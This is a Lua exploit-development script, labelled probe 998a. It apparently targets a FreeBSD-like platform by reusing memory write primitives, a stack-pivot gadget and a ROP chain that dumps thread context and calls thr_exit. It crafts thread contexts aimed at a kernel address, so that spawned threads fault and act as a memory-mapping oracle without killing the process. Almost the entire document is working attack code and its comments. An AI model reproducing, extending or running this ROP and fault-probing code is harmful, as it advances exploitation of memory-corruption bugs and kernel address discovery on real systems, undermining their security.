-- CRASH_CLASS: HIGH
-- PROBE 998a: turn the mapping oracle into a scanner
--
-- 996a gives one address per connection because the fault kills the loader process.
-- 997a showed a child's fault also takes the process down. The handler runs on the
-- faulting thread, so if its chain ends in thr_exit(431) instead of returning into the
-- broken frame, only the child should die and the parent should be able to spawn the
-- next candidate. This run takes four candidates in one connection and prints the
-- answer for each as a 0x100-byte context dump.

local TARGETS = { 0xFFFFFFFF80000000 }

print("=== PROBE 998a: FAULT SCAN LOOP ===")
print("")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function as_addr(t) local s=tostring(t) local m=s:match("0x(%x+)") if m then return tonumber(m,16) end return to_num(t) end
local function wq(a,v) pcall(function() memory.write_qword(uint64(a),uint64(v)) end) end

print(string.format("[A] pid=%u", to_num(mk(20)())))

-- chain: dump the context, then exit this thread so the process survives
local ph = gadgets.stack_pivot[1]
local ctxt = memory.alloc(8)
local exitsc = mk(431)
local chain = ropchain({ stack_base = to_num(ph.pivot_addr) })
chain:push_store_rdx_into_memory(ctxt)
chain:push_syscall_raw(syscall.write, function()
    chain:push_set_rdx(0x100)
    chain:push_set_rax_from_memory(ctxt)
    chain:push_add_to_rax(0xC0)
    chain:push_set_reg_from_rax("rsi")
    chain:push_set_reg_from_memory("rdi", signal.fd_addr)
end)
chain:push_syscall_raw(exitsc, function()
    chain:push_set_reg_from_rax("rdi")   -- status 0, harmless if it lands in rdi
end)
print("[B] chain installed (write + thr_exit)")

local page = 0x4000
local function mmap(px)
    local _, a = pcall(function() return mk(477)(uint64(0),uint64(px),uint64(3),uint64(0x1002),uint64(0xFFFFFFFF),uint64(0)) end)
    local v = to_num(a)
    if v ~= 0 and v < 0x800000000000 then
        for o = 0, px - 8, 8 do wq(v + o, 0) end
    end
    return v
end
local Ctx={MAGIC=0x108,TYPE=0x110,CS=0x0C0,RIP=0x0E0,RSP=0x0F8,SS=0x100}
local block = mmap(page * 4)
local start = block + page * 4 - 0x200
local ctx = memory.alloc(0x500)
local tb = memory.alloc(8)
local ts = memory.alloc(16)
print(string.format("[C] block=0x%X start=0x%X", block, start))

local okn = 0
for i, target in ipairs(TARGETS) do
    for o = 0, 0x4F8, 8 do wq(as_addr(ctx) + o, 0) end
    wq(as_addr(ctx)+Ctx.MAGIC,0x480); wq(as_addr(ctx)+Ctx.TYPE,0x10000)
    wq(as_addr(ctx)+Ctx.CS,0x43); wq(as_addr(ctx)+Ctx.SS,0x3B)
    wq(as_addr(ctx)+Ctx.RIP,target); wq(as_addr(ctx)+Ctx.RSP,start)
    wq(as_addr(tb),0)
    print(string.format("[D%d-pre] target=0x%X ctx=0x%X", i, target, as_addr(ctx)))
    local ok, rv = pcall(function() return mk(430)(uint64(as_addr(ctx)),uint64(as_addr(tb)),uint64(0)) end)
    print(string.format("[D%d] target=0x%X spawn ok=%s rv=%s", i, target, tostring(ok), ok and tostring(to_num(rv)) or ""))
    if ok and to_num(rv) == 0 then okn = okn + 1 end
    wq(as_addr(ts),0); wq(as_addr(ts)+8,250*1000000)
    pcall(function() mk(240)(uint64(as_addr(ts)),uint64(0)) end)
end
print(string.format("[E] spawned=%d alive pid=%u", okn, to_num(mk(20)())))
print("=== COMPLETE ===")
